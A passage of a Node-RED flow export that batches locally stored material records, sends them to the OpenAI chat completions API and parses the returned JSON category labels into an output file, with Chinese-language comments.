        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 300,
        "y": 320,
        "wires": [
            [
                "d277b38e4e56c7ea"
            ]
        ]
    },
    {
        "id": "d277b38e4e56c7ea",
        "type": "http request",
        "z": "b067bc3695a453e9",
        "g": "76e8b9242409efb9",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": true,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 450,
        "y": 320,
        "wires": [
            [
                "a0f969ff8c9646f0",
                "e984bccbd4b48d6c"
            ]
        ]
    },
    {
        "id": "46cb59f11084e062",
        "type": "function-gpt",
        "z": "b067bc3695a453e9",
        "g": "b64d795e4e2e57b0",
        "name": "function-gpt 10",
        "config": "44c9c8af11a9f982",
        "func": "//$PROMPT: 这个节点得到的输入是一个json格式如下：{   \"id\": \"chatcmpl-8IGV0N0GHRt0jk2KUWcYvO0ZqarHP\",   \"object\": \"chat.completion\",   \"created\": 1699364018,   \"model\": \"gpt-4-1106-preview\",   \"choices\": [     {       \"index\": 0,       \"message\": {         \"role\": \"assistant\",         \"content\": \"```json\\n{\\n  \\\"物料名称\\\": \\\"电排 KCS-100A\\\",\\n  \\\"一级类目\\\": \\\"配电及控制元件\\\"\\n}\\n```\"       },       \"finish_reason\": \"stop\"     }   ],   \"usage\": {     \"prompt_tokens\": 543,     \"completion_tokens\": 38,     \"total_tokens\": 581   },   \"system_fingerprint\": \"fp_a24b4d720c\" }把其中content返回的json提取出来并输出，输出中只包含content的内容\n\n// Parse the input JSON string to access the content\nconst input = msg.payload;\n// Access the content within the 'choices' array of the input and parse it as JSON\nlet contentJson = {};\nif(Array.isArray(input.choices) && input.choices.length > 0 && input.choices[0].message && input.choices[0].message.content){\n  // Extracting the JSON string from the `content` enclosed in ```\n  const jsonContentString = input.choices[0].message.content.replace(/```json\\n|\\n```/g, '');\n  try{\n    // Parsing the JSON string inside `content`\n    contentJson = JSON.parse(jsonContentString);\n  } catch(e){\n    // Handle potential errors during the parsing process (e.g., malformed JSON)\n    node.error('Error parsing JSON content: ' + e.message);\n    contentJson = {}; // Set as an empty object on parsing error\n  }\n}\n// Set the parsed JSON to the payload for output\nmsg.payload = contentJson;\n// Output the message from the node\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 440,
        "y": 520,
        "wires": [
            [
                "ca45b5a284a91fe0",
                "3410994f0bf8adc2"
            ]
        ]
    },
    {
        "id": "a0f969ff8c9646f0",
        "type": "json",
        "z": "b067bc3695a453e9",
        "g": "b64d795e4e2e57b0",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 270,
        "y": 520,
        "wires": [
            [
                "46cb59f11084e062"
            ]
        ]
    },
    {
        "id": "ca45b5a284a91fe0",
        "type": "join",
        "z": "b067bc3695a453e9",
        "g": "b64d795e4e2e57b0",
        "name": "",
        "mode": "custom",
        "build": "array",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": false,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "num",
        "reduceFixup": "",
        "x": 590,
        "y": 520,
        "wires": [
            [
                "a4275a88392b0f6a",
                "2fecdf68e7228495"
            ]
        ]
    },
    {
        "id": "a4275a88392b0f6a",
        "type": "file",
        "z": "b067bc3695a453e9",
        "g": "b64d795e4e2e57b0",
        "name": "2000json.json",
        "filename": "/data/new.json",
        "filenameType": "str",
        "appendNewline": true,
        "createDir": true,
        "overwriteFile": "false",
        "encoding": "none",
        "x": 760,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "47c2c599afb77f3a",
        "type": "json",
        "z": "b067bc3695a453e9",
        "g": "df53317ca4071932",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 470,
        "y": 160,
        "wires": [
            [
                "f7256db5ebc741ab",
                "90d6bb7e85e30ccd",
                "8c26bfa635be65d9"
            ]
        ]
    },
    {
        "id": "bd11c204772b2799",
        "type": "inject",
        "z": "b067bc3695a453e9",
        "g": "df53317ca4071932",
        "name": "",
        "props": [
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "x": 290,
        "y": 100,
        "wires": [
            [
                "4ef9f785d3d1f950"
            ]
        ]
    },
    {
        "id": "2fecdf68e7228495",
        "type": "debug",
        "z": "b067bc3695a453e9",
        "name": "debug 1",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 840,
        "y": 600,
        "wires": []
    },
    {
        "id": "e984bccbd4b48d6c",
        "type": "debug",
        "z": "b067bc3695a453e9",
        "name": "debug 2",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 1060,
        "y": 320,
        "wires": []
    },
    {
        "id": "2d4c49f03f981418",
        "type": "debug",
        "z": "b067bc3695a453e9",
        "name": "debug 3",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 1060,
        "y": 160,
        "wires": []
    },
    {
        "id": "b1cfbc8b037b1c2a",
        "type": "comment",
        "z": "b067bc3695a453e9",
        "g": "b64d795e4e2e57b0",
        "name": "解析ChatGPT返回的数据并格式化回JSON",
        "info": "",
        "x": 380,
        "y": 480,
        "wires": []
    },
    {
        "id": "3702ce9257eb7930",
        "type": "comment",
        "z": "b067bc3695a453e9",
        "g": "df53317ca4071932",
        "name": "格式化本地的5000条包含物料信息的JSON文件，做分批和定时发送处理",
        "info": "",
        "x": 490,
        "y": 200,
        "wires": []
    },
    {
        "id": "847c172300953af6",
        "type": "comment",
        "z": "b067bc3695a453e9",
        "g": "76e8b9242409efb9",
        "name": "按照ChatGPT的API格式GET给GPT4",
        "info": "",
        "x": 360,
        "y": 380,
        "wires": []
    },
    {
        "id": "4ef9f785d3d1f950",
        "type": "file in",
        "z": "b067bc3695a453e9",
        "g": "df53317ca4071932",
        "name": "data.json",
        "filename": "/data/data.json",
        "filenameType": "str",
        "format": "utf8",
        "chunk": false,
        "sendError": false,
        "encoding": "none",
        "allProps": false,
        "x": 440,
        "y": 100,
        "wires": [
            [
                "47c2c599afb77f3a"
            ]
        ]
    },
    {
        "id": "f7256db5ebc741ab",
        "type": "split",
        "z": "b067bc3695a453e9",
        "d": true,
        "g": "df53317ca4071932",
        "name": "Split into batches",
        "splt": "",
        "spltType": "str",
        "arraySplt": "100",
        "arraySpltType": "len",
        "stream": false,
        "addname": "",
        "x": 670,
        "y": 160,
        "wires": [
            [
                "e176467d7d3aa1c8"
            ]
        ]
    },
    {
        "id": "8c26bfa635be65d9",
        "type": "debug",
        "z": "b067bc3695a453e9",
        "g": "df53317ca4071932",
        "name": "debug 70",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 640,
        "y": 100,
        "wires": []
    },
    {
        "id": "3410994f0bf8adc2",
        "type": "debug",
        "z": "b067bc3695a453e9",
        "name": "debug 71",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 600,
        "y": 600,
        "wires": []
    }
]